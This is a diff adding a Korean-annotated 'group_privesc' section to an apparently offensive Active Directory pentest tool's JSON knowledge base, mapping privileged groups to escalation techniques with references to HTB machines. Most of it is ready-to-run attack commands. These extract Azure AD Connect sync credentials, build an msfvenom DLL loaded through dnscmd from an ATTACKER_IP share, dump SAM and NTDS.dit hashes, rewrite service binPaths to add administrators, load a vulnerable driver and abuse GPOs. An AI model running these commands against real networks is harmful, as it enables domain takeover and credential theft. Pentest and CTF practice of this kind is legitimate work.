@@ -533,6 +533,112 @@
     }
   },
 
+  "group_privesc": {
+    "_note": "이름 있는 특권 그룹 멤버십은 ACL 엣지가 아니라 PETS 가 엣지로는 못 잡는다. 그룹 이름(부분일치)으로 알려진 기법을 매핑. owned 가 속한 그룹을 최우선.",
+    "AZURE ADMINS": {
+      "ko": "Azure AD Connect(ADSync) 자격증명 추출 → 동기화 계정(도메인 관리자급) 비번 복구",
+      "priority": "high",
+      "summary": "박스에 Azure AD Connect 설치 시 로컬 SQL(ADSync) 에 저장된 동기화 계정 비번을 복호화. HTB Monteverde 정공법.",
+      "cmd": [
+        "# [대상 호스트에서 실행] ADSync LocalDB 에 저장된 자격증명 복호화",
+        "Import-Module .\\AADInternals.psd1; Get-AADIntSyncCredentials",
+        "# 또는 azuread_decrypt_msol.ps1 (LocalDB 쿼리 후 복호화) 실행",
+        "# 또는 AdDecrypt.exe -FullSQL  (AdSyncDecrypt, mcrypt.dll 동봉 필요)",
+        "# 복구된 관리자 비번으로 로그인:",
+        "evil-winrm -i dc01 -u administrator -p '<복구된_비밀번호>'"
+      ],
+      "tools": [
+        {"name": "AADInternals (Get-AADIntSyncCredentials)", "type": "ps1", "url": "https://github.com/Gerenios/AADInternals"},
+        {"name": "azuread_decrypt_msol.ps1", "type": "ps1", "url": "https://github.com/VbScrub/AdSyncDecrypt"},
+        {"name": "AdSyncDecrypt (AdDecrypt.exe)", "type": "exe", "url": "https://github.com/VbScrub/AdSyncDecrypt"}
+      ],
+      "refs": ["https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/azuread-connect-hybrid-connect-decrypt"]
+    },
+    "DNSADMINS": {
+      "ko": "DNS 서비스에 악성 DLL 로드 → SYSTEM(보통 DC 에서 실행)",
+      "priority": "high",
+      "summary": "DnsAdmins 는 dnscmd 로 서버레벨 플러그인 DLL 을 지정 가능. DNS 서비스가 SYSTEM 으로 그 DLL 로드.",
+      "cmd": [
+        "msfvenom -p windows/x64/exec CMD='net group \"Domain Admins\" attacker /add /domain' -f dll -o evil.dll",
+        "# 대상에서: DLL 경로 지정 (UNC 공유 또는 로컬 경로)",
+        "dnscmd DC01 /config /serverlevelplugindll \\\\ATTACKER_IP\\share\\evil.dll",
+        "sc.exe stop dns && sc.exe start dns",
+        "# 정리: dnscmd DC01 /config /serverlevelplugindll (빈 값)"
+      ],
+      "tools": [{"name": "mimilib.dll / 커스텀 DLL", "type": "exe", "url": "https://github.com/gentilkiwi/mimikatz"}],
+      "refs": ["https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dnsadmins-privesc"]
+    },
+    "BACKUP OPERATORS": {
+      "ko": "SeBackupPrivilege → SAM/SYSTEM 또는 NTDS.dit 복사 후 해시 추출",
+      "priority": "high",
+      "summary": "백업 권한으로 잠긴 하이브/NTDS 를 읽어 해시 덤프. DC 면 도메인 전체 장악.",
+      "cmd": [
+        "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive",
+        "# DC 라면 diskshadow 로 NTDS.dit 백업본 생성 후 복사 (SeBackupPrivilege PoC)",
+        "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
+        "impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL"
+      ],
+      "tools": [
+        {"name": "SeBackupPrivilege PoC", "type": "ps1", "url": "https://github.com/giuliano108/SeBackupPrivilege"},
+        {"name": "impacket secretsdump", "type": "py", "url": "https://github.com/fortra/impacket"}
+      ],
+      "refs": ["https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges"]
+    },
+    "SERVER OPERATORS": {
+      "ko": "서비스 수정/시작 권한 → 서비스 binPath 를 SYSTEM 명령으로 교체",
+      "priority": "high",
+      "summary": "Server Operators 는 서비스 설정/재시작 가능. 아무 서비스의 실행 경로를 바꿔 SYSTEM 명령 실행.",
+      "cmd": [
+        "sc.exe config VSS binPath= \"cmd /c net localgroup administrators attacker /add\"",
+        "sc.exe stop VSS && sc.exe start VSS",
+        "sc.exe config VSS binPath= \"C:\\Windows\\system32\\vssvc.exe\""
+      ],
+      "tools": [],
+      "refs": ["https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges"]
+    },
+    "PRINT OPERATORS": {
+      "ko": "SeLoadDriverPrivilege → 취약 드라이버(Capcom.sys) 로드로 SYSTEM",
+      "priority": "med",
+      "summary": "Print Operators 는 드라이버 로드 권한 보유. 취약 커널 드라이버를 로드해 SYSTEM.",
+      "cmd": [
+        "# EoPLoadDriver.exe 로 레지스트리 등록 + Capcom.sys 로드 후 익스플로잇",
+        "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Temp\\Capcom.sys"
+      ],
+      "tools": [{"name": "EoPLoadDriver", "type": "exe", "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"}],
+      "refs": ["https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges"]
+    },
+    "HYPER-V ADMINISTRATORS": {
+      "ko": "Hyper-V 관리자 → 심볼릭 링크/vhd 조작으로 SYSTEM",
+      "priority": "med",
+      "summary": "vmms 관련 권한/심볼릭 링크 남용, 또는 삭제된 VM 복원 트릭으로 SYSTEM 획득.",
+      "cmd": ["# 알려진 Hyper-V Administrators 상승 PoC 참고 (심볼릭 링크 기반)"],
+      "tools": [],
+      "refs": ["https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges"]
+    },
+    "GROUP POLICY CREATOR OWNERS": {
+      "ko": "새 GPO 생성 → OU 에 링크해 코드 실행",
+      "priority": "med",
+      "summary": "GPO 를 만들어 대상 OU 에 연결하면 하위 컴퓨터/사용자에 명령/로컬관리자 추가.",
+      "cmd": [
+        "New-GPO -Name Evil | New-GPLink -Target 'OU=Servers,DC=corp,DC=local'",
+        "pygpoabuse corp.local/attacker:'Passw0rd!' -gpo-id '<GUID>' -command 'net localgroup administrators attacker /add'"
+      ],
+      "tools": [{"name": "pyGPOAbuse / SharpGPOAbuse", "type": "py", "url": "https://github.com/Hackndo/pyGPOAbuse"}],
+      "refs": ["https://wald0.com/?p=179"]
+    },
+    "ACCOUNT OPERATORS": {
+      "ko": "비보호 계정/그룹 관리 → 비보호 특권그룹에 자신 추가 (예: Exchange Windows Permissions)",
+      "priority": "high",
+      "summary": "Account Operators 는 보호되지 않은 그룹의 멤버를 수정 가능. 종종 도메인 장악의 발판(HTB Forest).",
+      "cmd": [
+        "net group \"<비보호 특권그룹>\" attacker /add /domain",
+        "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add groupMember \"<비보호 특권그룹>\" attacker"
+      ],
+      "tools": [{"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"}],
+      "refs": ["https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges"]
+    }
+  },
+
   "adcs": {
     "_note": "AD CS(인증서 서비스) 권한상승은 bloodhound-python 기본 수집에 없으므로 PETS 가 자동탐지하지 못한다. 반드시 Certipy 로 직접 점검할 것. 아래는 ESC1~ESC13 참고 + 악용 명령.",
     "detect": {
